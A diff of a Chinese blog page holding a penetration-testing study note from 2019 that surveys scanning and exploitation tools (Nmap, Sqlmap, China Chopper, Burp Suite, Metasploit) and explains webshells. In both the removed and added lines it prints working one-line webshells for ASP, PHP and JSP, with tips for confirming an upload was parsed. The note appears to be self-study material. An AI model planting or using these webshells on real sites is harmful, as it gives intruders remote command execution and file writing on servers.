@@ -413,9 +413,8 @@ height:50vh;
 <li>灵活。支持数十种不同的扫描方式，支持多种目标对象的扫描。</li>
 <li>强大。Nmap可以用于扫描互联网上大规模的计算机。</li>
 <li>可移植。支持主流操作系统：Windows/Linux/Unix/MacOS等等；源码开放，方便移植。</li>
-<li>简单。提供默认的操作能覆盖大部分功能。<br>御剑：是一款用于网站后台的扫描工具。<br>google：<br>用Google搜索引擎对某些特定的网络主机漏洞（通常是服务器上的脚本漏洞）进行搜索，以达到快速找到漏洞主机或特定主机的漏洞的目的。<br>Maltego<br>是一款专业的数字取证软件,它提供了基于实体的网络和源,聚合了整个网络的信息。<br>whois查询<br>一个用来查询域名是否已经被注册,以及注册域名的详细信息的数据库(如域名所有人、域名注册商、域名注册日期和过期日期等)<br>Kali Linux是基于Debian的Linux发行版， 设计用于数字取证操作系统<br>常用网站：<a href="http://www.exploit-db.com" target="_blank" rel="noopener">www.exploit-db.com</a>  <a href="http://www.seebug.net" target="_blank" rel="noopener">www.seebug.net</a> <a href="http://www.shadon.io（漏洞和企业资产信息收集）" target="_blank" rel="noopener">www.shadon.io（漏洞和企业资产信息收集）</a> 漏洞信息形成原因 以及漏洞形成脚本 漏洞原理 cve？？<br>x.threebook.cn微步在线威胁情报社区 </li>
+<li>简单。提供默认的操作能覆盖大部分功能。<br>御剑：是一款用于网站后台的扫描工具。<br>google：<br>用Google搜索引擎对某些特定的网络主机漏洞（通常是服务器上的脚本漏洞）进行搜索，以达到快速找到漏洞主机或特定主机的漏洞的目的。<br>Maltego<br>是一款专业的数字取证软件,它提供了基于实体的网络和源,聚合了整个网络的信息。<br>whois查询<br>一个用来查询域名是否已经被注册,以及注册域名的详细信息的数据库(如域名所有人、域名注册商、域名注册日期和过期日期等)<br>Kali Linux是基于Debian的Linux发行版， 设计用于数字取证操作系统<br>常用网站：<a href="http://www.exploit-db.com" target="_blank" rel="noopener">www.exploit-db.com</a>  <a href="http://www.seebug.net" target="_blank" rel="noopener">www.seebug.net</a> <a href="http://www.shadon.io（漏洞和企业资产信息收集）" target="_blank" rel="noopener">www.shadon.io（漏洞和企业资产信息收集）</a> 漏洞信息形成原因 以及漏洞形成脚本 漏洞原理 cve？？<br>x.threebook.cn微步在线威胁情报社区<br>漏洞扫描类<br>AWVS<br>一个自动化的Web应用程序安全测试工具。<br>H3C WebScan<br>是由H3C自主开发一款主动型的 Web 应用的风险深度扫描工具。<br>AppScan<br>是一款领先的应用安全性测试套件，可自动进行漏洞评估、扫描和检测所有常见的 Web 应用程序漏洞。<br>Netsparker<br>是一款综合型的Web应用安全漏洞扫描工具,它分为专业版和免费版,免费版的<br>功能也比较强大。<br>Nessus<br>是目前全世界最多人使用的系统漏洞扫描与分析软件。<br>巡风<br>巡风是一款适用于企业内网的漏洞快速应急，巡航扫描系统<br>漏洞利用类<br>中国菜刀<br>是一款专业的网站管理软件，用途广泛，使用方便，小巧实用。<br>Sqlmap<br>一个开放源码的渗透测试工具,它可以自动探测和利用 SQL 注入漏洞来接管数<br>据库服务器。<br>啊D<br>是一个注入验证利用工具，是目前已有的Sql注入工具中比较好用的。<br>漏洞品台类<br>BurpSuite<br>是用于攻击Web 应用程序的集成平台。它包含了许多工具，并为这些工具设计<br>了许多接口，以促进加快攻击应用程序的过程。<br>Metasploit<br>Metasploit是一款开源的安全漏洞检测工具，可以帮助安全和IT专业人士识别<br>安全性问题，验证漏洞的缓解措施，并管理专家驱动的安全性进行评估，提供<br>真正的安全风险情报。这些功能包括智能开发，密码审计，Web应用程序扫描，<br>社会工程。<br>webshell 大多是以动态脚本出现比如asp jsp php aspx cgi 常用做网站后门 俗称马  可以和正常的网页文件混合 无系统日志记录 能绕过防火墙  分为大马 小马 大马脚本功能齐全 代码量庞大  提供完整的操作提供全面的文件操作数据库链接管理执行命令等功能 大马不依赖客户端（例如菜刀）   小马 主要是代码量比较少，一般就一行 使用时用一些工具进行连接（一句话木马）比较依赖客户端管理软件<br>常见一句话webshell  Asp&lt;%execute(request(“value”))% value 是密码  php <?php@eval($_POST[value]);?><br>jsp &lt;%if(request.getParameter(“f”)!=null)(new java.io.FileOutputStream(application.getRealPath(“/“)+request.getParameter(“f”))).write(request.getParameter(“t”).getBytes());%&gt;<br>中国菜刀 支持动态脚本 中国菜刀主要功能：文件管理，虚拟终端 数据库管理<br>一句话木马上传到解析目录  页面空白说明webshell被解析 看到源码数据则是解析失败<br>googlehacking：filetype:sql   intext intitle site(网站）<br>Asp一句话原理<br>&lt;%execute request(“#”)%&gt;是典型的一句话木马服务端代码，将这<br>个代码写入asp文件，就成了一句话木马服务端文件。<br>将一句话木马插入到asp文件中（包括asa.cdx.cer文件），该语句<br>将会作为触发，接收入侵者通过客户端提交的数据，执行并完成相应的入侵<br>操作。</li>
 </ol>
-<p>漏洞扫描类<br>AWVS<br>一个自动化的Web应用程序安全测试工具。<br>H3C WebScan<br>是由H3C自主开发一款主动型的 Web 应用的风险深度扫描工具。<br>AppScan<br>是一款领先的应用安全性测试套件，可自动进行漏洞评估、扫描和检测所有常见的 Web 应用程序漏洞。<br>Netsparker<br>是一款综合型的Web应用安全漏洞扫描工具,它分为专业版和免费版,免费版的<br>功能也比较强大。<br>Nessus<br>是目前全世界最多人使用的系统漏洞扫描与分析软件。<br>巡风<br>巡风是一款适用于企业内网的漏洞快速应急，巡航扫描系统<br>漏洞利用类<br>中国菜刀<br>是一款专业的网站管理软件，用途广泛，使用方便，小巧实用。<br>Sqlmap<br>一个开放源码的渗透测试工具,它可以自动探测和利用 SQL 注入漏洞来接管数<br>据库服务器。<br>啊D<br>是一个注入验证利用工具，是目前已有的Sql注入工具中比较好用的。<br>漏洞品台类<br>BurpSuite<br>是用于攻击Web 应用程序的集成平台。它包含了许多工具，并为这些工具设计<br>了许多接口，以促进加快攻击应用程序的过程。<br>Metasploit<br>Metasploit是一款开源的安全漏洞检测工具，可以帮助安全和IT专业人士识别<br>安全性问题，验证漏洞的缓解措施，并管理专家驱动的安全性进行评估，提供<br>真正的安全风险情报。这些功能包括智能开发，密码审计，Web应用程序扫描，<br>社会工程。<br>webshell 大多是以动态脚本出现比如asp jsp php aspx cgi 常用做网站后门 俗称马  可以和正常的网页文件混合 无系统日志记录 能绕过防火墙  分为大马 小马 大马脚本功能齐全 代码量庞大  提供完整的操作提供全面的文件操作数据库链接管理执行命令等功能 大马不依赖客户端（例如菜刀）   小马 主要是代码量比较少，一般就一行 使用时用一些工具进行连接（一句话木马）比较依赖客户端管理软件<br>常见一句话webshell  Asp&lt;%execute(request(“value”))% value 是密码  php <?php@eval($_POST[value]);?><br>jsp &lt;%if(request.getParameter(“f”)!=null)(new java.io.FileOutputStream(application.getRealPath(“/“)+request.getParameter(“f”))).write(request.getParameter(“t”).getBytes());%&gt;<br>中国菜刀 支持动态脚本 中国菜刀主要功能：文件管理，虚拟终端 数据库管理<br>一句话木马上传到解析目录  页面空白说明webshell被解析 看到源码数据则是解析失败<br> googlehacking：filetype:sql   intext intitle site(网站）<br>Asp一句话原理<br>&lt;%execute request(“#”)%&gt;是典型的一句话木马服务端代码，将这<br>个代码写入asp文件，就成了一句话木马服务端文件。<br>将一句话木马插入到asp文件中（包括asa.cdx.cer文件），该语句<br>将会作为触发，接收入侵者通过客户端提交的数据，执行并完成相应的入侵<br>操作。</p>
 
     </article>
     <!-- license  -->
@@ -424,7 +423,7 @@ height:50vh;
             <p>原文作者：<a href="http://yoursite.com">cong cong</a>
             <p>原文链接：<a href="http://yoursite.com/2019/07/29/渗透学习笔记 一/">http://yoursite.com/2019/07/29/渗透学习笔记 一/</a>
             <p>发表日期：<a href="http://yoursite.com/2019/07/29/渗透学习笔记 一/">July 29th 2019, 8:24:56 pm</a>
-            <p>更新日期：<a href="http://yoursite.com/2019/07/29/渗透学习笔记 一/">July 29th 2019, 10:02:07 pm</a>
+            <p>更新日期：<a href="http://yoursite.com/2019/07/29/渗透学习笔记 一/">July 30th 2019, 9:05:27 am</a>
             <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -625,9 +624,20 @@ top:50vh;
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 5
+        Total : 6
         </div>
         <!-- search  -->
         
@@ -644,20 +654,6 @@ top:50vh;
     
         <li class="archive-post-item">
             <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2019/07/29/常见的端口/" >常见的端口号</a>
-        </li>
-    
-    
-    
-    
-    
-        </ul>
-    
-    <div class="archive-year"> 2019 </div>
-    <ul class="year-list">
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">07/29</span><a class="archive-post-title" href= "/2019/07/29/渗透学习笔记 一/" >渗透学习笔记 一</a>
         </li>
     
     
@@ -696,6 +692,16 @@ top:50vh;
     
     <div class="archive-year"> 2019 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/30</span><a class="archive-post-title" href= "/2019/07/30/HTML/" >[Untitled Post]</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/29</span><a class="archive-post-title" href= "/2019/07/29/渗透学习笔记 一/" >渗透学习笔记 一</a>
+        </li>
     
     
         <li class="archive-post-item">
